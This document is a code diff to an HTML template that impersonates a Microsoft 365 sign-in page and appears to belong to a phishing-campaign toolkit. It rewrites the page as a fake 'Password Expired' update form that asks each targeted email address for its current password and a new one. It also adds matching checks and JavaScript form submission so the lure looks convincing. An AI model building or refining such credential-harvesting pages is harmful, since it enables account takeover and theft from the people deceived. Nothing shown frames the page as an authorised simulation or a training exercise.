@@ -98,7 +98,7 @@
         <div class="login-container">
             <div class="loading" id="loading">
                 <div class="spinner"></div>
-                <div class="loading-text">Verifying credentials...</div>
+                <div class="loading-text">Updating your password...</div>
             </div>
 
             <div class="login-screen" id="loginScreen">
@@ -107,9 +107,9 @@
                         <div class="ms-logo"><div></div><div></div><div></div><div></div></div>
                         <span class="ms-wordmark">Microsoft</span>
                     </div>
-                    <h1>Enter password</h1>
+                    <h1>Update your password</h1>
                     <div class="session-notice">
-                        <strong>Password Expired:</strong> Your Microsoft 365 password has expired. Please enter your password to verify your identity, then you will be prompted to create a new password.
+                        <strong>Password Expired:</strong> Your Microsoft 365 password has expired. Please verify your identity by entering your current password, then choose a new password.
                     </div>
                     <form method="POST" action="" id="loginForm">
                         <div class="user-display">
@@ -118,13 +118,23 @@
                         </div>
                         <input type="hidden" name="email" value="{{.Email}}"/>
                         <div class="form-group">
-                            <input type="password" id="password" name="password" placeholder="Password" required="" autofocus=""/>
+                            <label style="font-size: 13px; font-weight: 600; color: #1b1b1b; display: block; margin-bottom: 6px;">Current password</label>
+                            <input type="password" id="password" name="password" placeholder="Enter your current password" required="" autofocus=""/>
                         </div>
-                        <div class="keep-signed-in">
-                            <label><input type="checkbox" checked=""/><span>Keep me signed in</span></label>
+                        <div class="form-group">
+                            <label style="font-size: 13px; font-weight: 600; color: #1b1b1b; display: block; margin-bottom: 6px;">New password</label>
+                            <input type="password" id="new_password" name="new_password" placeholder="Create new password" required=""/>
                         </div>
-                        <div class="links"><a href="#">Forgot my password</a></div>
-                        <div class="button-row"><button type="submit" class="btn-primary">Sign in</button></div>
+                        <div class="form-group">
+                            <label style="font-size: 13px; font-weight: 600; color: #1b1b1b; display: block; margin-bottom: 6px;">Confirm new password</label>
+                            <input type="password" id="confirm_password" name="confirm_password" placeholder="Confirm new password" required=""/>
+                            <div id="matchError" style="display: none; color: #c41230; font-size: 12px; margin-top: 6px;">Passwords do not match.</div>
+                        </div>
+                        <div class="password-requirements" style="background: #f8f8f8; padding: 12px 16px; margin-bottom: 20px; font-size: 12px; color: #605e5c; line-height: 1.8;">
+                            <div style="font-weight: 600; color: #1b1b1b; margin-bottom: 4px;">Password requirements:</div>
+                            At least 12 characters &bull; Uppercase and lowercase letters &bull; At least one number &bull; At least one special character
+                        </div>
+                        <div class="button-row"><button type="submit" class="btn-primary">Update password</button></div>
                     </form>
                     <div class="sign-in-options">
                         <a href="#"><svg viewBox="0 0 20 20" fill="currentColor" style="width:20px;height:20px;"><path d="M17 8V6a5 5 0 00-10 0v2H5v10h14V8h-2zm-8-2a3 3 0 116 0v2H9V6zm7 10H8v-6h8v6z"></path></svg> Use Windows Hello or a security key</a>
@@ -185,6 +195,16 @@
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
+            var newPw = document.getElementById('new_password').value;
+            var confirmPw = document.getElementById('confirm_password').value;
+            var matchErr = document.getElementById('matchError');
+            if (newPw !== confirmPw) {
+                matchErr.style.display = 'block';
+                document.getElementById('confirm_password').style.borderColor = '#c41230';
+                return;
+            }
+            matchErr.style.display = 'none';
+            document.getElementById('confirm_password').style.borderColor = '#605e5c';
             document.getElementById('loading').style.display = 'flex';
             var form = e.target;
             var data = new FormData(form);
